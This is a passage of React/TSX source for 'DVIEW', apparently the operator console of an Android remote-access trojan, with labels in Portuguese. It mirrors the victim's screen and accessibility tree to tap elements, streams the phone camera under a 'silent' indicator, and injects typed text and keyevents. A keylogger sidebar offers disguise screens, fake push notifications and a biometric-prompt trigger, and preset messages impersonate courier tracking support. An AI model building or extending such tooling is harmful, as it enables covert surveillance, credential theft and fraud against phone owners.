                                : "linear-gradient(135deg, rgba(15, 23, 42, 0.95) 0%, rgba(20, 28, 45, 0.88) 100%)",
                              boxShadow: isSelected ? "0 0 14px rgba(0, 240, 255, 0.6)" : "0 2px 8px rgba(0,0,0,0.4)",
                              borderRadius: "8px",
                              display: "flex",
                              alignItems: "center",
                              justifyContent: "space-between",
                              padding: "0 10px",
                              pointerEvents: "none",
                              zIndex: isSelected ? 35 : 20,
                              boxSizing: "border-box",
                              transition: "all 0.15s ease"
                            }}
                          >
                            <span
                              style={{
                                fontSize: "11px",
                                fontWeight: 700,
                                color: isSelected ? "#00f0ff" : "#f8fafc",
                                overflow: "hidden",
                                textOverflow: "ellipsis",
                                whiteSpace: "nowrap"
                              }}
                            >
                              {rawTitle}
                            </span>
                            <span style={{ fontSize: "14px" }}>{catIcon}</span>
                          </div>
                        );
                      }

                      // 7. Generic Nodes: If no text, render delicate bounding box or skip
                      if (!rawTitle) {
                        if (node.clickable) {
                          return (
                            <div
                              key={node.id}
                              title={`${shortClass} (${node.bounds})`}
                              style={{
                                position: "absolute",
                                left: `${b.leftPercent}%`,
                                top: `${b.topPercent}%`,
                                width: `${b.widthPercent}%`,
                                height: `${b.heightPercent}%`,
                                border: isSelected ? "2px solid #00f0ff" : "1px dashed rgba(56, 189, 248, 0.3)",
                                backgroundColor: isSelected ? "rgba(0, 240, 255, 0.12)" : "transparent",
                                borderRadius: "6px",
                                pointerEvents: "none",
                                zIndex: isSelected ? 30 : 10,
                                boxSizing: "border-box"
                              }}
                            >
                              {isSelected && (
                                <span style={{ fontSize: "7.5px", color: "#00f0ff", fontFamily: "var(--font-mono)", position: "absolute", top: "1px", left: "2px" }}>
                                  {shortClass}
                                </span>
                              )}
                            </div>
                          );
                        }
                        if (!isSelected) {
                          return null;
                        }
                      }

                      const isTitleOrHeader = b.height >= 32 || (rawTitle && (rawTitle.length > 25 || rawTitle.includes("?") || rawTitle.includes("!")));
                      return (
                        <div
                          key={node.id}
                          title={`${shortClass}: ${rawTitle} (${node.bounds})`}
                          style={{
                            position: "absolute",
                            left: `${b.leftPercent}%`,
                            top: `${b.topPercent}%`,
                            width: `${b.widthPercent}%`,
                            height: `${b.heightPercent}%`,
                            border: isSelected
                              ? "2px solid #00f0ff"
                              : node.clickable
                              ? "1.5px solid rgba(34, 197, 94, 0.65)"
                              : "1px solid rgba(148, 163, 184, 0.28)",
                            backgroundColor: isSelected
                              ? "rgba(0, 240, 255, 0.16)"
                              : node.clickable
                              ? "rgba(15, 23, 42, 0.88)"
                              : "rgba(12, 17, 29, 0.78)",
                            boxShadow: isSelected
                              ? "0 0 14px rgba(0, 240, 255, 0.5)"
                              : "0 2px 6px rgba(0, 0, 0, 0.35)",
                            borderRadius: "6px",
                            display: "flex",
                            alignItems: "center",
                            justifyContent: isTitleOrHeader ? "flex-start" : "center",
                            padding: "3px 6px",
                            overflow: "hidden",
                            pointerEvents: "none",
                            transition: "all 0.15s ease",
                            zIndex: isSelected ? 30 : node.clickable ? 20 : 10,
                            boxSizing: "border-box"
                          }}
                        >
                          <span
                            style={{
                              fontSize: isTitleOrHeader ? "11px" : "10px",
                              fontWeight: isTitleOrHeader ? 700 : 500,
                              color: isSelected ? "#00f0ff" : node.clickable ? "#22c55e" : "#ffffff",
                              lineHeight: 1.25,
                              maxWidth: "100%",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                              wordBreak: "break-word",
                              display: "-webkit-box",
                              WebkitLineClamp: Math.max(1, Math.floor(b.height / 18)),
                              WebkitBoxOrient: "vertical"
                            }}
                          >
                            {rawTitle}
                          </span>
                        </div>
                      );
                    });
                  })()}

                  {/* Millimeter Precision Target Crosshair Reticle Overlay */}
                  {inspectedNode && (() => {
                    const b = parseBounds(inspectedNode.bounds);
                    if (!b) return null;
                    const cleanTargetTitle = sanitizeA11yText(inspectedNode.text || inspectedNode.name || "Elemento");
                    return (
                      <div
                        style={{
                          position: "absolute",
                          left: `${b.leftPercent}%`,
                          top: `${b.topPercent}%`,
                          width: `${b.widthPercent}%`,
                          height: `${b.heightPercent}%`,
                          border: "2px solid #00f0ff",
                          boxShadow: "0 0 16px rgba(0, 240, 255, 0.85), inset 0 0 10px rgba(0, 240, 255, 0.35)",
                          borderRadius: "8px",
                          pointerEvents: "none",
                          zIndex: 95,
                          animation: "pulse 1.2s infinite ease-in-out"
                        }}
                      >
                        <div
                          style={{
                            position: "absolute",
                            top: "-18px",
                            left: "2px",
                            background: "linear-gradient(135deg, #00f0ff 0%, #0284c7 100%)",
                            color: "#040810",
                            fontSize: "8.5px",
                            fontWeight: 900,
                            fontFamily: "var(--font-mono)",
                            padding: "1px 6px",
                            borderRadius: "3px",
                            boxShadow: "0 2px 6px rgba(0,0,0,0.6)",
                            display: "flex",
                            alignItems: "center",
                            gap: "4px",
                            whiteSpace: "nowrap"
                          }}
                        >
                          <Crosshair size={9} />
                          <span>ALVO: {cleanTargetTitle.slice(0, 22)}</span>
                        </div>
                      </div>
                    );
                  })()}
                </div>
              ) : (
                <div
                  className="sr-wireframe-viewport"
                  style={{
                    position: "relative",
                    width: `${viewportDimensions.screenWidth}px`,
                    height: `${viewportDimensions.screenHeight}px`,
                    aspectRatio: `${deviceAspectRatio}`,
                    overflowY: "auto",
                    padding: "12px",
                    display: "flex",
                    flexDirection: "column",
                    gap: "8px",
                    background: "#090b10",
                    boxSizing: "border-box"
                  }}
                >
                  {a11yNodes.length === 0 ? (
                    <div style={{ margin: "auto", textAlign: "center", color: "#64748b", fontSize: "12px" }}>
                      Nenhum elemento inspecionado. Clique em atualizar para carregar a hierarquia do dispositivo.
                    </div>
                  ) : (
                    a11yNodes.map((node) => {
                      const isSelected = inspectedNode?.id === node.id;
                      const shortClass = node.className.split(".").pop() || "Elemento";
                      const cleanTitle = sanitizeA11yText(node.text || node.contentDescription || node.name || "");
                      const detectedApp = detectAppFromNode(node, resolvedActiveApp);
                      return (
                        <div
                          key={node.id}
                          onClick={() => handleSelectA11yNode(node)}
                          style={{
                            padding: "10px",
                            borderRadius: "8px",
                            border: isSelected ? "1px solid #38bdf8" : "1px solid #1e293b",
                            background: isSelected
                              ? "rgba(56, 189, 248, 0.12)"
                              : node.clickable
                              ? "rgba(34, 197, 94, 0.08)"
                              : "rgba(15, 23, 42, 0.4)",
                            cursor: "pointer",
                            transition: "all 0.15s ease"
                          }}
                        >
                          <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", marginBottom: "4px" }}>
                            <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                              {detectedApp && (
                                <AppLogo name={detectedApp.name} packageName={detectedApp.packageName} size={16} />
                              )}
                              <span style={{ fontSize: "11px", fontWeight: 700, color: node.clickable ? "#22c55e" : "#94a3b8" }}>
                                {detectedApp ? detectedApp.name : shortClass}
                              </span>
                            </div>
                            {node.clickable && (
                              <span style={{ fontSize: "9px", background: "#22c55e", color: "#000", fontWeight: 800, padding: "2px 6px", borderRadius: "4px" }}>
                                INTERATIVO (CLIQUE)
                              </span>
                            )}
                          </div>
                          <div style={{ fontSize: "12px", color: "#f8fafc", fontWeight: 600, wordBreak: "break-word" }}>
                            {cleanTitle || shortClass}
                          </div>
                          <div style={{ fontSize: "10px", color: "#64748b", fontFamily: "var(--font-mono)", marginTop: "4px" }}>
                            {node.bounds}
                          </div>
                        </div>
                      );
                    })
                  )}
                </div>
              )}

              {/* Floating Sleek Node Inspector Overlay (Preserves 100% viewport height) */}
              {inspectedNode && (() => {
                const nodeTitle = sanitizeA11yText(inspectedNode.contentDescription || inspectedNode.text || inspectedNode.name);
                const detectedApp = detectAppFromNode(inspectedNode, resolvedActiveApp);
                return (
                  <div
                    className="sr-node-inspector-bar"
                    style={{
                      position: "absolute",
                      bottom: "52px",
                      left: "10px",
                      right: "10px",
                      display: "flex",
                      alignItems: "center",
                      gap: "8px",
                      padding: "6px 10px",
                      background: "rgba(11, 15, 25, 0.94)",
                      border: "1px solid rgba(56, 189, 248, 0.4)",
                      borderRadius: "10px",
                      boxShadow: "0 8px 24px rgba(0, 0, 0, 0.8)",
                      backdropFilter: "blur(10px)",
                      zIndex: 80
                    }}
                  >
                    <div
                      style={{
                        width: "28px",
                        height: "28px",
                        borderRadius: "6px",
                        background: "rgba(15, 23, 42, 0.8)",
                        border: "1px solid #334155",
                        display: "flex",
                        alignItems: "center",
                        justifyContent: "center",
                        flexShrink: 0
                      }}
                    >
                      {detectedApp ? (
                        <AppLogo name={detectedApp.name} packageName={detectedApp.packageName} size={20} />
                      ) : inspectedNode.className.includes("EditText") ? (
                        <Terminal size={14} color="#00f0ff" />
                      ) : inspectedNode.className.endsWith("Button") || inspectedNode.clickable ? (
                        <MousePointer size={14} color="#38bdf8" />
                      ) : (
                        <Layers size={14} color="#94a3b8" />
                      )}
                    </div>
                    <div style={{ flex: 1, minWidth: 0 }}>
                      <div className="inspector-row" style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
                        <span className="inspector-title" style={{ color: "#38bdf8", fontWeight: 700, fontSize: "10.5px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                          {detectedApp ? detectedApp.name : nodeTitle}
                        </span>
                        <span className="inspector-bounds" style={{ fontSize: "8.5px", color: "#64748b", fontFamily: "var(--font-mono)" }}>
                          {inspectedNode.bounds}
                        </span>
                      </div>
                      <div className="inspector-desc" style={{ fontSize: "9px", color: "#94a3b8", display: "flex", alignItems: "center", gap: "6px", marginTop: "1px" }}>
                        <span style={{ fontFamily: "var(--font-mono)", fontSize: "8.5px" }}>
                          {detectedApp ? detectedApp.packageName : inspectedNode.className.split(".").pop()}
                        </span>
                        {inspectedNode.clickable && (
                          <span style={{ color: "#22c55e", fontWeight: 700, fontSize: "8.5px", background: "rgba(34, 197, 94, 0.15)", padding: "1px 4px", borderRadius: "3px" }}>
                            ● INTERATIVO
                          </span>
                        )}
                      </div>
                    </div>
                    {inspectedNode.clickable && (
                      <button
                        onClick={(e) => handleSelectA11yNode(inspectedNode, e)}
                        style={{
                          background: "linear-gradient(135deg, #0284c7 0%, #0369a1 100%)",
                          border: "1px solid #38bdf8",
                          color: "#ffffff",
                          fontSize: "9.5px",
                          fontWeight: 700,
                          padding: "3px 8px",
                          borderRadius: "4px",
                          cursor: "pointer",
                          display: "flex",
                          alignItems: "center",
                          gap: "4px",
                          flexShrink: 0
                        }}
                      >
                        <Zap size={10} />
                        Tocar
                      </button>
                    )}
                    <button
                      type="button"
                      onClick={() => setInspectedNode(null)}
                      title="Fechar barra de inspeção"
                      style={{
                        background: "transparent",
                        border: "none",
                        color: "#94a3b8",
                        cursor: "pointer",
                        padding: "2px 4px",
                        display: "flex",
                        alignItems: "center",
                        flexShrink: 0
                      }}
                    >
                      <X size={13} />
                    </button>
                  </div>
                );
              })()}

              {/* BARRA DE NAVEGAÇÃO ANDROID VIRTUAL NATIVA (NO ESQUELETO 2D) */}
              <div className="android-hardware-navbar">
                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 187", "Trocar Telas / Recentes")}
                  title="Trocar de Telas / Aplicativos Recentes (KEYCODE_APP_SWITCH 187)"
                >
                  <span className="nav-btn-icon">|||</span>
                  <span className="nav-btn-text">RECENTES</span>
                </button>

                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 3", "Iniciar / Home")}
                  title="Tela Inicial / Iniciar (KEYCODE_HOME 3)"
                >
                  <span className="nav-btn-icon">○</span>
                  <span className="nav-btn-text">INICIAR</span>
                </button>

                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 4", "Voltar")}
                  title="Voltar Tela Anterior (KEYCODE_BACK 4)"
                >
                  <span className="nav-btn-icon">◁</span>
                  <span className="nav-btn-text">VOLTAR</span>
                </button>
              </div>
            </div>
          )}

          {/* PAINEL 3: CÂMERA AO VIVO DO APARELHO (3ª TELA SIMULTÂNEA COM FEED ÓPTICO) */}
          {camActive && (
            <div
              className="tactical-phone-viewport live-camera-frame"
              style={{
                width: `${viewportDimensions.frameWidth}px`,
                height: `${viewportDimensions.frameHeight}px`,
                position: "relative",
                overflow: "hidden",
                display: "flex",
                flexDirection: "column",
                boxSizing: "border-box",
                flexShrink: 0
              }}
            >
              {/* Top Control Header on Camera Phone Frame */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "6px 10px",
                  background: "#0b0f19",
                  borderBottom: "1px solid #1e293b",
                  zIndex: 10
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  <div
                    className="tactical-phone-silent-pill"
                    style={{
                      position: "static",
                      transform: "none",
                      background: "rgba(56, 189, 248, 0.2)",
                      borderColor: "#38bdf8",
                      color: "#38bdf8"
                    }}
                  >
                    CÂMERA · {activeCamera === "back" ? "50MP" : "12MP"}
                  </div>
                </div>

                <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
                  <button
                    type="button"
                    onClick={() => {
                      const nextCam = activeCamera === "back" ? "front" : "back";
                      setActiveCamera(nextCam);
                      showToast(`Câmera alternada para ${nextCam === "back" ? "Traseira" : "Frontal"}`, "info");
                    }}
                    title="Alternar entre câmera frontal e traseira"
                    style={{
                      background: "#1e293b",
                      border: "1px solid #334155",
                      color: "#cbd5e1",
                      borderRadius: "4px",
                      padding: "2px 6px",
                      fontSize: "9px",
                      fontWeight: 700,
                      cursor: "pointer",
                      display: "flex",
                      alignItems: "center",
                      gap: "3px"
                    }}
                  >
                    <RotateCw size={10} />
                    <span>{activeCamera === "back" ? "Traseira" : "Frontal"}</span>
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      setTorchOn(!torchOn);
                      showToast(torchOn ? "Lanterna desligada" : "Lanterna ativada no aparelho", "success");
                    }}
                    title="Ligar ou desligar lanterna LED"
                    style={{
                      background: torchOn ? "rgba(250, 204, 21, 0.25)" : "#1e293b",
                      border: `1px solid ${torchOn ? "#facc15" : "#334155"}`,
                      color: torchOn ? "#facc15" : "#94a3b8",
                      borderRadius: "4px",
                      padding: "2px 5px",
                      cursor: "pointer"
                    }}
                  >
                    <Lightbulb size={11} />
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      setNightVision(!nightVision);
                      showToast(nightVision ? "Modo Noturno desativado" : "Modo Noturno / ISO Ativado", "info");
                    }}
                    title="Visão Noturna / Ganho ISO"
                    style={{
                      background: nightVision ? "rgba(34, 197, 94, 0.25)" : "#1e293b",
                      border: `1px solid ${nightVision ? "#22c55e" : "#334155"}`,
                      color: nightVision ? "#22c55e" : "#94a3b8",
                      borderRadius: "4px",
                      padding: "2px 5px",
                      cursor: "pointer"
                    }}
                  >
                    <Moon size={11} />
                  </button>
                </div>
              </div>

              {/* Camera Optical Viewfinder Container */}
              <div
                className="camera-viewfinder-container"
                style={{
                  position: "relative",
                  width: `${viewportDimensions.screenWidth}px`,
                  height: `${viewportDimensions.screenHeight}px`,
                  aspectRatio: `${deviceAspectRatio}`,
                  background: "#040508",
                  overflow: "hidden",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  filter: nightVision ? "brightness(1.35) contrast(1.2) hue-rotate(90deg)" : "none",
                  boxSizing: "border-box"
                }}
              >
                {/* Viewfinder visual feed */}
                <img
                  src={`${api.getDeviceScreenUrl(device.id)}?cam=1&t=${screenTimestamp}`}
                  alt="Feed da Câmera"
                  style={{
                    width: "100%",
                    height: "100%",
                    objectFit: "cover",
                    transform: activeCamera === "front" ? "scaleX(-1)" : "none",
                    opacity: 0.9
                  }}
                  onError={(e) => {
                    (e.currentTarget as HTMLImageElement).style.opacity = "0.4";
                  }}
                />

                {/* Optical Reticle & Rule of Thirds Grid Overlay */}
                {showCameraGrid && (
                  <div className="camera-optical-grid-overlay">
                    <div className="camera-grid-line h-1" />
                    <div className="camera-grid-line h-2" />
                    <div className="camera-grid-line v-1" />
                    <div className="camera-grid-line v-2" />
                    <div className="camera-center-crosshair">
                      <span className="crosshair-bracket top-left" />
                      <span className="crosshair-bracket top-right" />
                      <span className="crosshair-bracket bottom-left" />
                      <span className="crosshair-bracket bottom-right" />
                      <span className="crosshair-dot" />
                    </div>
                  </div>
                )}

                {/* Telemetry Badge on Viewfinder */}
                <div className="camera-telemetry-hud">
                  <span className="hud-tag">ÓPTICO</span>
                  <span className="hud-metric">{activeCamera === "back" ? "24mm f/1.8" : "18mm f/2.2"}</span>
                  <span className="hud-metric">ISO 400</span>
                  <span className="hud-resolution">{cameraResolution}</span>
                </div>

                {/* Floating Shutter Capture Button */}
                <div className="camera-shutter-bar">
                  <button
                    type="button"
                    className={`camera-shutter-trigger ${isCapturingPhoto ? "capturing" : ""}`}
                    onClick={handleCaptureCameraPhoto}
                    title="Capturar Foto"
                  >
                    <div className="shutter-inner-circle" />
                  </button>
                </div>

                {/* Flash effect when capturing */}
                {isCapturingPhoto && <div className="camera-shutter-flash-overlay" />}
              </div>

              {/* Android Hardware Navbar at Bottom */}
              <div className="android-hardware-navbar">
                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 187", "Recentes")}
                  title="Trocar Telas / Recentes"
                >
                  <span className="nav-btn-icon">|||</span>
                  <span className="nav-btn-text">RECENTES</span>
                </button>

                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 3", "Home")}
                  title="Tela Inicial"
                >
                  <span className="nav-btn-icon">○</span>
                  <span className="nav-btn-text">INICIAR</span>
                </button>

                <button
                  type="button"
                  className="android-nav-btn"
                  onClick={() => handleMacroAction("input keyevent 4", "Voltar")}
                  title="Voltar"
                >
                  <span className="nav-btn-icon">◁</span>
                  <span className="nav-btn-text">VOLTAR</span>
                </button>
              </div>
            </div>
          )}

          {/* Empty state when 0 screens active */}
          {activeScreensCount === 0 && (
            <div className="tactical-no-screens-card">
              <Smartphone size={36} style={{ color: "#38bdf8" }} />
              <h3 style={{ margin: "10px 0 6px 0", color: "#f8fafc" }}>Nenhuma Tela Selecionada</h3>
              <p style={{ color: "#94a3b8", fontSize: "12px", maxWidth: "360px", margin: "0 auto" }}>
                Ative as telas que deseja visualizar simultaneamente na barra superior:
              </p>
              <div style={{ display: "flex", gap: "8px", justifyContent: "center", marginTop: "14px" }}>
                <button type="button" className="primary compact-btn" onClick={() => setTelaActive(true)}>
                  + Ativar Tela Ao Vivo
                </button>
                <button type="button" className="secondary compact-btn" onClick={() => setSrActive(true)}>
                  + Ativar Esqueleto 2D
                </button>
                <button type="button" className="secondary compact-btn" onClick={() => setCamActive(true)}>
                  + Ativar Câmera
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Floating Fullscreen Exit Hint Banner matching capture */}
        {showExitHint && (
          <div
            className="tactical-fullscreen-hint-banner"
            onClick={() => setShowExitHint(false)}
            title="Toque para dispensar"
          >
            Pressione Esc ou arraste de cima para baixo da tela para sair da tela cheia
          </div>
        )}
      </div>

      {/* 5. RODAPÉ TÁTICO: Terminal Shell / Digitação Aprimorada com Histórico de Conversas e Olho do Sistema */}
      {shellActive && (
        <footer className="tactical-footer-shell" style={{ position: "relative" }}>
          {/* Painel Expansível de Histórico de Mensagens / Conversas Enviadas ao Celular (Rolável para baixo) */}
          {showHistoryDrawer && (
            <div
              className="tactical-sent-history-drawer"
              style={{
                position: "absolute",
                bottom: "100%",
                left: 0,
                right: 0,
                background: "rgba(9, 12, 20, 0.98)",
                border: "1px solid #1e293b",
                borderBottom: "1px solid #ff1a2a",
                borderRadius: "8px 8px 0 0",
                boxShadow: "0 -8px 24px rgba(0, 0, 0, 0.8)",
                backdropFilter: "blur(12px)",
                zIndex: 40,
                maxHeight: "260px",
                display: "flex",
                flexDirection: "column",
                overflow: "hidden"
              }}
            >
              {/* Header do Histórico */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  padding: "7px 12px",
                  background: "rgba(15, 23, 42, 0.8)",
                  borderBottom: "1px solid #1e293b"
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  <History size={13} style={{ color: "#38bdf8" }} />
                  <span style={{ fontSize: "11px", fontWeight: 700, color: "#f8fafc", letterSpacing: "0.4px" }}>
                    HISTÓRICO DE MENSAGENS E INPUTS ENVIADOS ({sentHistory.length})
                  </span>
                  <span style={{ fontSize: "9.5px", color: "#64748b" }}>• Digitação via Suporte</span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                  <button
                    type="button"
                    onClick={() => {
                      setSentHistory([]);
                      try {
                        localStorage.removeItem(`dview_sent_history_${device.id}`);
                      } catch {}
                      showToast("Histórico de mensagens limpo.", "info");
                    }}
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "#64748b",
                      fontSize: "10px",
                      cursor: "pointer",
                      display: "inline-flex",
                      alignItems: "center",
                      gap: "3px"
                    }}
                    title="Limpar histórico"
                  >
                    <Trash2 size={11} />
                    <span>Limpar</span>
                  </button>
                  <button
                    type="button"
                    onClick={() => setShowHistoryDrawer(false)}
                    style={{
                      background: "transparent",
                      border: "none",
                      color: "#94a3b8",
                      fontSize: "12px",
                      cursor: "pointer",
                      padding: "0 4px"
                    }}
                    title="Fechar histórico"
                  >
                    ✕
                  </button>
                </div>
              </div>

              {/* Presets Rápidos de Suporte */}
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: "6px",
                  padding: "5px 12px",
                  background: "rgba(10, 14, 24, 0.6)",
                  borderBottom: "1px solid rgba(30, 41, 59, 0.5)",
                  overflowX: "auto",
                  whiteSpace: "nowrap"
                }}
              >
                <span style={{ fontSize: "9.5px", fontWeight: 700, color: "#94a3b8" }}>Presets:</span>
                {[
                  "Favor confirmar na tela",
                  "Aguarde a atualização",
                  "Código de rastreamento validado",
                  "https://jadlog.com.br",
                  "input keyevent 66"
                ].map((preset, idx) => (
                  <button
                    key={idx}
                    type="button"
                    onClick={() => handleSendPresetText(preset)}
                    style={{
                      background: "rgba(30, 41, 59, 0.6)",
                      border: "1px solid #334155",
                      borderRadius: "10px",
                      padding: "1px 7px",
                      fontSize: "9.5px",
                      color: "#cbd5e1",
                      cursor: "pointer"
                    }}
                  >
                    + {preset}
                  </button>
                ))}
              </div>

              {/* Lista de Mensagens / Conversas com Rolagem para Baixo */}
              <div
                style={{
                  padding: "8px 12px",
                  overflowY: "auto",
                  display: "flex",
                  flexDirection: "column",
                  gap: "6px"
                }}
              >
                {sentHistory.length === 0 ? (
                  <div style={{ textAlign: "center", padding: "16px", color: "#64748b", fontSize: "11px" }}>
                    Nenhuma mensagem ou comando enviado recentemente. Digite abaixo e pressione Enviar.
                  </div>
                ) : (
                  sentHistory.map((item) => (
                    <div
                      key={item.id}
                      style={{
                        display: "flex",
                        alignItems: "flex-start",
                        justifyContent: "space-between",
                        gap: "8px",
                        background: "rgba(15, 23, 42, 0.6)",
                        border: "1px solid #1e293b",
                        borderRadius: "6px",
                        padding: "6px 9px"
                      }}
                    >
                      <div style={{ display: "flex", flexDirection: "column", gap: "2px", flex: 1, minWidth: 0 }}>
                        <div style={{ display: "flex", alignItems: "center", gap: "6px" }}>
                          <span style={{ fontSize: "9px", fontWeight: 700, color: "#ff4d5a", fontFamily: "var(--font-mono)" }}>
                            OP / SUPORTE
                          </span>
                          <span style={{ fontSize: "9px", color: "#64748b" }}>{item.timestamp}</span>
                          {item.appName && (
                            <span style={{ fontSize: "9px", color: "#38bdf8", background: "rgba(56, 189, 248, 0.12)", padding: "0 4px", borderRadius: "3px" }}>
                              {item.appName}
                            </span>
                          )}
                          <span style={{ fontSize: "9px", color: "#22c55e", display: "inline-flex", alignItems: "center", gap: "2px" }}>
                            <Check size={9} /> Injetado
                          </span>
                        </div>
                        <div
                          style={{
                            fontSize: "11px",
                            color: "#f8fafc",
                            fontFamily: "var(--font-mono)",
                            wordBreak: "break-all"
                          }}
                        >
                          {item.text}
                        </div>
                      </div>

                      <div style={{ display: "flex", alignItems: "center", gap: "4px", flexShrink: 0 }}>
                        <button
                          type="button"
                          onClick={() => {
                            navigator.clipboard.writeText(item.text);
                            showToast("Texto copiado para a área de transferência", "success");
                          }}
                          style={{
                            background: "transparent",
                            border: "1px solid #334155",
                            borderRadius: "4px",
                            padding: "2px 5px",
                            color: "#94a3b8",
                            fontSize: "9px",
                            cursor: "pointer"
                          }}
                          title="Copiar texto"
                        >
                          <Copy size={10} />
                        </button>
                        <button
                          type="button"
                          onClick={() => {
                            setCommand(item.text);
                            showToast("Texto inserido no terminal pronto para reenvio", "info");
                          }}
                          style={{
                            background: "rgba(56, 189, 248, 0.15)",
                            border: "1px solid rgba(56, 189, 248, 0.4)",
                            borderRadius: "4px",
                            padding: "2px 6px",
                            color: "#38bdf8",
                            fontSize: "9px",
                            fontWeight: 700,
                            cursor: "pointer"
                          }}
                          title="Reenviar este texto para o aparelho"
                        >
                          Reenviar
                        </button>
                      </div>
                    </div>
                  ))
                )}
              </div>
            </div>
          )}

          <form className="tactical-shell-command-form" onSubmit={handleSendShellCommand} style={{ width: "100%", margin: 0 }}>
            {/* ONDE ESTÁ DVIEW: O Olho Cibernético e Logo do Sistema DVIEW com Glow Carmesim */}
            <div
              className="tactical-cmd-prompt-badge"
              title="DVIEW Console - Logo Oficial do Sistema com Olho Cibernético"
              style={{
                display: "inline-flex",
                alignItems: "center",
                gap: "5px",
                padding: "2px 6px",
                background: "rgba(255, 26, 42, 0.12)",
                border: "1px solid rgba(255, 26, 42, 0.35)",
                borderRadius: "5px",
                flexShrink: 0
              }}
            >
              <img
                src="./dview-logo.jpg"
                alt="DVIEW Emblem"
                style={{
                  width: "14px",
                  height: "14px",
                  borderRadius: "50%",
                  objectFit: "cover",
                  border: "1px solid #ff1a2a",
                  boxShadow: "0 0 6px rgba(255, 26, 42, 0.7)"
                }}
                onError={(e) => {
                  (e.currentTarget as any).style.display = "none";
                }}
              />
              <Eye size={12} style={{ color: "#ff1a2a" }} />
              {!showRightSidebar && (
                <span style={{ fontWeight: 800, color: "#ff4d5a", letterSpacing: "0.5px" }}>DVIEW:~$</span>
              )}
            </div>

            <input
              type="text"
              value={command}
              onChange={(e) => setCommand(e.target.value)}
              onKeyDown={handleKeyDownCommandInput}
              placeholder={showRightSidebar ? "Digite texto para enviar ao aparelho (Enter para enviar)..." : "Digite texto para digitar no celular ou comando shell (↑/↓ histórico, Enter para enviar)..."}
              className="tactical-cmd-input"
              style={{ flex: 1 }}
            />

            {/* Quando a barra lateral direita NÃO estiver aberta, exibe botões extras de Histórico e Enviar */}
            {!showRightSidebar && (
              <>
                <button
                  type="button"
                  className={`tactical-history-toggle-btn ${showHistoryDrawer ? "active" : ""}`}
                  onClick={() => setShowHistoryDrawer(!showHistoryDrawer)}
                  style={{
                    background: showHistoryDrawer ? "rgba(56, 189, 248, 0.2)" : "rgba(15, 23, 42, 0.6)",
                    border: `1px solid ${showHistoryDrawer ? "#38bdf8" : "#1e293b"}`,
                    borderRadius: "5px",
                    padding: "3px 8px",
                    color: showHistoryDrawer ? "#38bdf8" : "#cbd5e1",
                    fontSize: "11px",
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    gap: "5px",
                    flexShrink: 0
                  }}
                  title="Abrir histórico de conversas e mensagens enviadas ao aparelho"
                >
                  <MessageSquare size={12} />
                  <span>Histórico ({sentHistory.length})</span>
                  {showHistoryDrawer ? <ChevronUp size={11} /> : <ChevronDown size={11} />}
                </button>

                <button type="submit" className="tactical-cmd-submit-btn" title="Enviar texto ao celular" style={{ flexShrink: 0 }}>
                  <Send size={13} />
                  <span>Enviar</span>
                </button>
              </>
            )}
          </form>
        </footer>
      )}
    </div>

    {/* Floating Toggle Button on Right Edge (when sidebar is closed) */}
    {!showRightSidebar && (
      <button
        type="button"
        className="tactical-floating-right-tab"
        onClick={() => setShowRightSidebar(true)}
        title="Expandir Submenu Direito (Teclas, Telas & Push)"
        style={{
          borderColor: activeDisguise?.active ? "#ff1a2a" : "#22c55e",
          color: activeDisguise?.active ? "#ff4d5a" : "#22c55e"
        }}
      >
        <ChevronLeft size={13} style={{ flexShrink: 0 }} />
        {activeDisguise?.active ? (
          <Smartphone size={13} style={{ color: "#ff1a2a" }} />
        ) : (
          <Keyboard size={13} style={{ color: "#22c55e" }} />
        )}
        <span>{activeDisguise?.active ? "TELAS (ATIVA)" : "TECLAS & TELAS"}</span>
      </button>
    )}

    {/* Right Sidebar Keylogger & Disguise Screens Drawer */}
    <RightSidebarKeylogger
      device={device}
      isOpen={showRightSidebar}
      onClose={() => setShowRightSidebar(false)}
      onVolumeChange={handleVolumeChange}
      deviceVolume={deviceVolume}
      isMuted={isMuted}
      onToggleMute={() => handleVolumeStep("mute")}
      onTriggerBiometric={() => handleBiometricAuth()}
      showToast={showToast}
      activeDisguise={activeDisguise}
      onDisguiseChange={setActiveDisguise}
      initialTab={sidebarInitialTab}
      onPushNotificationSent={(notif) => {
        if (pushBannerTimerRef.current) {
          clearTimeout(pushBannerTimerRef.current);
        }
        setActivePushBanner(notif);
        pushBannerTimerRef.current = window.setTimeout(() => {
          setActivePushBanner(null);
        }, 7500);
      }}
    />
  </div>
    </div>
  );
}
